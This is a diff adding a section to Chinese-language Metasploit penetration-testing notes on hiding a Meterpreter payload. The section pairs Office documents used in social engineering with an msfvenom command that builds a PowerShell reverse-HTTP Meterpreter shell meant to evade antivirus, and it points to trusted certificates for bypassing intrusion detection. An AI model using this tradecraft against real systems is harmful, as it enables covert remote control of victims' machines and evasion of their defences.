@@ -198,7 +198,20 @@ exploits执行成功后，在目标系统真正执行的代码或指令等操作
 
 
 
+## 混淆Meterpreter的Payload
 
+如果我们正在针对目标进行一些社工尝试，我们可能会使用Word或Excel文档作为我们的payload（攻击载荷）
+的载体。但是，一个潜在的问题是我们可能无法包含 Meterpreter的payload的二进制文件或让目标机器从Web
+下载我们的payload，因为这些操作可能会触发目标机器中的杀毒软件的警报。所以，这里给出一个简单的解决方
+案，使用PowerShell进行模糊处理：
+
+```
+msfvenom -payload windows/x64/meterpreter_reverse_http -format psh -out meterpreter-
+64.ps1 LHOST=127.0.0.1
+```
+
+此外，使用受信任的机构签发的SSL/TLS证书可以帮助我们绕过某些网络中的IDS（入侵检测系统），具体可以参
+考[Meterpreter Paranoid Mode](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode)。
 
 
 
